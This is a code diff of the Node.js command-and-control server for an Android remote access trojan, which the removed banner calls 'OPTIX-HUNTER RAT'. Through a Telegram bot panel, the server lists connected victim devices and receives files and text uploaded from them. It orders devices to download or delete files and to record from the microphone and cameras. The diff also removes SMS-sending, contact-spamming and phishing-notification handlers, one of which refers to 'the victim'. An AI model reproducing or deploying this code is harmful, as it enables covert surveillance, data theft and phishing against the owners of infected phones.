@@ -21,40 +21,20 @@ const appClients = new Map()
 const upload = multer();
 app.use(bodyParser.json());
 
+
+
 let currentUuid = ''
 let currentNumber = ''
 let currentTitle = ''
 
-
-//============<<<>>>================
-
-const gr = '\x1b[32m';
-const mg = '\x1b[35m';
-const cy = '\x1b[36m';
-const yl = '\x1b[33m';
-const bl = '\x1b[34m';
-const red = '\x1b[31m';
-const rst = '\x1b[0m';
-
-app.listen(PORT, () => {
-  console.clear();
-  console.log(`
-${bl}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${rst}[+] ${mg}OPTIX-HUNTER RAT${rst}
-${rst}[+] ${cy}SERVER PORT: ${PORT}${rst}
-${rst}[+] ${gr}DEVELOPED BY: MD BAIZID MOSTAFA${rst}
-[+] ${yl}TEAM NAME: OPTIX-HUNTER${rst}
-[+] ${mg}https://github.com/BAIZID-171${rst}
-[+] ${cy}https://t.me/Optix_Hunter${bl}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
-});
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">\x0a\x20\x20\x20\x20<!DOCTYPE\x20html>\x0a\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<title>OPTIX\x20HUNTER\x20RAT</title>\x0a\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h1>OPTIX\x20HUNTER\x20RAT</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>Welcome\x20To\x20Optix-Hunter</p><p>Github\x20:\x20https://github.com/BAIZID-171</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>Telegram\x20:\x20https://t.me/Mr_Alone171</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://raw.githubusercontent.com/BAIZID-171/BAIZID-171.github.io/main/assets/img/Baizid.jpg\x22\x20alt=\x22\x22\x20style=\x22width:\x20195px;\x20height:\x20200px;\x20border-radius:\x2050%;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>━━━━\x20Connect\x20with\x20me\x20━━━━</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.facebook.com/profile.php?id=61550026974499\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/facebook.svg\x22\x20alt=\x22BAIZID-171\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://twitter.com/Baizid171\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/twitter.svg\x22\x20alt=\x22AloneBoy\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://t.me/Optix_Hunter\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://www.freepnglogos.com/uploads/telegram-logo-png-0.png\x22\x20alt=\x22BAIZID-171\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://instagram.com/fashu_x\x22\x20target=\x22blank\x22><img\x20align=\x22center\x22\x20src=\x22https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg\x22\x20alt=\x22BAIZID-171\x22\x20height=\x2230\x22\x20width=\x2240\x22\x20/></a>\x0a\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20</html>\x0a</h1>')})
+    res.send('<h1 align="center">Alive</h1>')
+})
+
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
     appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
+            caption: `Data from <b>${req.headers.model}</b> device`,
             parse_mode: "HTML"
         },
         {
@@ -64,14 +44,10 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• Messages from <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
-app.post("/uploadLocation", (req, res) => {
-    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
-    res.send('')
-})
+
 appSocket.on('connection', (ws, req) => {
     const uuid = uuid4.v4()
     const model = req.headers.model
@@ -89,7 +65,7 @@ appSocket.on('connection', (ws, req) => {
         provider: provider
     })
     appBot.sendMessage(id,
-        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
+        `°• Device Connected\n\n` +
         `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
         `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
         `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
@@ -99,7 +75,7 @@ appSocket.on('connection', (ws, req) => {
     )
     ws.on('close', function () {
         appBot.sendMessage(id,
-            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
+            `°• Device Disconnected\n\n` +
             `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
             `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
             `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
@@ -113,55 +89,7 @@ appSocket.on('connection', (ws, req) => {
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (message.reply_to_message) {
-        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
-            currentNumber = message.text
-            appBot.sendMessage(id,
-                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
-                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
-                {reply_markup: {force_reply: true}}
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`send_message:${currentNumber}/${message.text}`)
-                }
-            });
-            currentNumber = ''
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
-            const message_to_all = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`send_message_to_all:${message_to_all}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
+        if (message.reply_to_message.text.includes('Enter path file to download')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -170,18 +98,16 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
+                '°• Processing...',                {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["Devices"], ["Execute"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
+        if (message.reply_to_message.text.includes('Enter path file to delete')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -190,18 +116,16 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
+                '°• Processing...',                {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["Devices"], ["Execute"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
+        if (message.reply_to_message.text.includes('Enter duration microphone')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -210,18 +134,16 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
+                '°• Processing...',                {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["Devices"], ["Execute"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
+        if (message.reply_to_message.text.includes('Enter duration camera main')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -230,18 +152,16 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
+                '°• Processing...',                {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["Devices"], ["Execute"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
+        if (message.reply_to_message.text.includes('Enter duration camera selfie')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -250,112 +170,38 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                '°• Processing...',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["Devices"], ["Execute"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
-            const toastMessage = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`toast:${toastMessage}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
-            const notificationMessage = message.text
-            currentTitle = notificationMessage
-            appBot.sendMessage(id,
-                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
-                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
-                {reply_markup: {force_reply: true}}
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
-            const link = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`show_notification:${currentTitle}/${link}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
-        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
-            const audioLink = message.text
-            appSocket.clients.forEach(function each(ws) {
-                if (ws.uuid == currentUuid) {
-                    ws.send(`play_audio:${audioLink}`)
-                }
-            });
-            currentUuid = ''
-            appBot.sendMessage(id,
-                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-                {
-                    parse_mode: "HTML",
-                    "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                        'resize_keyboard': true
-                    }
-                }
-            )
-        }
+
     }
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
-                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
-                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
-                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
-                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ\n\n──────────────────────\nᴍᴏᴅɪꜰɪᴇᴅ ʙʏ : @Mr_Alone171\nɢʀᴏᴜᴘ: @Optix_Hunters\nᴄʜᴀɴɴᴇʟ : @Optix_Hunter\n─────────────────────',
+                'Hello!',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["Devices"], ["Execute"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
+        if (message.text == 'Devices') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+                    '°• No Connecting Devices',
                 )
             } else {
-                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
+                let text = 'List Connected Devices :\n\n'
                 appClients.forEach(function (value, key, map) {
                     text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                         `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
